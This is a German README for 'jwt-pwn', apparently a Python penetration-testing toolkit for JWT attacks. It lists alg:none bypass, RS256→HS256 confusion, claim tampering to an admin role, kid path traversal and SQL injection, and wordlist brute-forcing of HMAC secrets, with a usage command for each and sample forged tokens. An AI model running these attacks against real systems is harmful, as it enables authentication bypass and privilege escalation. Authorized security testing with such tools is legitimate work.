# jwt-pwn

Ein Python-3-Toolkit ohne externe Abhängigkeiten zum Aufspüren und Ausnutzen von JWT-Schwachstellen — gebaut für Penetrationstests an Webanwendungen.

> **Nur für autorisierte Sicherheitstests.** Ausschließlich gegen Systeme einsetzen, die du selbst besitzt oder für die du eine ausdrückliche schriftliche Genehmigung hast.

## Implementierte Angriffe

| Angriff | CVE-Klasse | Beschreibung |
|---------|-----------|--------------|
| `alg:none` | Signatur-Bypass | Entfernt die Signatur, setzt `alg` auf `none`/`None`/`NONE`/`nOnE` |
| RS256→HS256 Confusion | Algorithm Confusion | Signiert mit HS256, verwendet den RSA Public Key als HMAC-Secret |
| Claim Tampering | Privilege Escalation | Verändert `role`, `admin`, `exp`, `sub`, `iss` usw. |
| `kid` Path Traversal | Key Confusion | Setzt `kid` auf `/dev/null` → leeres HMAC-Secret |
| `kid` SQL Injection | SQLI im Header | Schleust SQL-Payload in das `kid`-Feld ein |
| HMAC Brute-Force | Schwaches Secret | Wörterbuchangriff gegen HS256/384/512-Secrets |

## Verwendung

```bash
# JWT dekodieren und analysieren
python jwt_pwn.py --decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# alg:none-Angriff — erzeugt 4 Varianten
python jwt_pwn.py --token eyJ... --alg-none

# RS256 → HS256 Confusion (RSA Public Key des Servers angeben)
python jwt_pwn.py --token eyJ... --rs256-hs256 server_pubkey.pem

# Claims manipulieren und neu signieren (bekanntes Secret)
python jwt_pwn.py --token eyJ... --tamper '{"role":"admin","exp":"+9999d"}' --secret weakpassword

# kid Path Traversal → mit leerem Key signieren
python jwt_pwn.py --token eyJ... --kid path_traversal

# kid SQL Injection
python jwt_pwn.py --token eyJ... --kid sql_injection

# HMAC-Secret per Brute-Force knacken
python jwt_pwn.py --token eyJ... --brute /usr/share/wordlists/rockyou.txt

# JSON-Ausgabe für die Integration in andere Tools
python jwt_pwn.py --token eyJ... --alg-none --json
```

## Beispiel: alg:none

```
[+] alg:none
    alg_value: none
    token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.

[+] alg:none
    alg_value: None
    token: eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0In0.
```

## Beispiel: Dekodierter JWT

```
── Header ──────────────────────────────
{
  "alg": "HS256",
  "typ": "JWT"
}
── Payload ─────────────────────────────
{
  "sub": "1234567890",
  "role": "user",
  "exp": 1716000000
}
  ⚠ EXPIRED 86400s ago
── Signature (32 bytes) ─────────────
8a7f...
```

## Voraussetzungen

Python 3.9+ — keine externen Abhängigkeiten.

## Quellen & Referenzen

- [PortSwigger: JWT attacks](https://portswigger.net/web-security/jwt)
- [RFC 7519: JSON Web Token](https://tools.ietf.org/html/rfc7519)
- [CVE-2015-9235: alg:none in mehreren JWT-Bibliotheken](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)

## Lizenz

MIT License — Copyright (c) 2026 Yanis Ameseder

---

**Bitcoin:** `39vZWmnUwDReQ15BwqQXzyqVQ6U8LardEf`

**Kontakt:** [g4me.over.18@gmail.com](mailto:g4me.over.18@gmail.com)
**PayPal:** [paypal.me/Freakbank1](https://paypal.me/Freakbank1)
